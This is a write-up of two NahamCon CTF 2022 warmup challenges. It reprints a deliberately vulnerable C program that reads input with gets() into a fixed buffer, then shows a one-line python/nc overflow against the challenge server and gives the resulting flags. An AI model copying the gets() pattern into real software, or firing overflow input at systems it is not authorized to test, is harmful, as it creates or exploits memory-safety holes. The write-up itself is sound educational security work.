---
title: NahamCon CTF 2022 - Warmup Writeup Part 2
published: true
---

Part 2 of the warmup challenges for NahamCon CTF 2022.  Part 1 is [here](https://ruddles.github.io/NahamCon-CTF-2022-Warmup-1)

# Crash Override

> Remember, hacking is more than just a crime. It's a survival trait.
> 
> Attachments: crash_override.c, Makefile, crash_override
> 
> Connect to `nc challenge.nahamcon.com 30637`

To start off we can download the 3 files using wget

```
wget -o crash_override.c https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/crash_override.c?token=<my-token>
wget -o Makefile https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/Makefile?token=<my-token>
wget -o crash_override https://ctf.nahamcon.com/files/f9dc325add89e0bd3302d94d0f370dca/crash_override?token=<my-token>
```

Opening up the C file reveals the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <signal.h>

void win(int sig) {
    FILE *fp = NULL;
    char *flag = NULL;
    struct stat sbuf;

    if ((fp = fopen("flag.txt", "r")) == NULL) {
        puts("Failed to open the flag. If this is on the challenge server, contact an admin.");
        exit(EXIT_FAILURE);
    }

    if (fstat(fileno(fp), &sbuf)) {
        puts("Failed to get flag.txt file status. If this is on the challenge server, contact an admin.");
        exit(EXIT_FAILURE);
    }

    flag = calloc(sbuf.st_size + 1, sizeof(char));
    if (!flag) {
        puts("Failed to allocate memory.");
        exit(EXIT_FAILURE);
    }

    fread(flag, sizeof(char), sbuf.st_size, fp);
    puts(flag);

    free(flag);

    exit(EXIT_SUCCESS);
}

int main(void) {
    char buffer[2048];

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    signal(SIGSEGV, win);

    puts("HACK THE PLANET!!!!!!");
    gets(buffer);

    return 0;
}
```

Reading the code, the line `signal(SIGSEGV, win);` means if we can cause a segmentation fault (i.e. cause the application to access memory it isn't allowed to) then the `win` function will run and print out the flag.

The easiest way to cause a seg fault is to cause a buffer overflow, which is where we attempt to stuff more data into a memory location than the application is expecting.

Do you see it?  Look at the first and second-to-last lines in main.  `char buffer[2048];` is setting up a buffer with 2048 bytes of space.  Then `gets(buffer);` will take whatever is in stdin and stuff it into the buffer.  So what happens if stdin contains more than 2048 bytes of data?  Boom.  That's what.  Never use gets.  Hell, even the [bugs section on the man page says don't use it](https://linux.die.net/man/3/gets).

To blow this popsicle stand and get the flag we just need to connect to the server and give it a big load of data on stdin.  We're not going to type all those chars, this is an expensive keyboard, we'll use python for that.  Let's give it 3000 "A" chars for good measure.

```
python3 -c 'print("A" * 3000)' | nc challenge.nahamcon.com 30637
```

Running that and boom, the flag is dumped. `flag{de8b6655b538a0bf567b79a14f2669f6}`

# Read The Rules

> Please follow the rules for this CTF!

How was this not the most solved?  Anyway, I digress.  Go to the rules page at https://ctf.nahamcon.com/rules, view source and Ctrl-f for "flag{" and would you look at that...

![screenshot of the source]({{ site.url }}/assets/post-images/nahamcon-warmup/read-the-rules-source.png)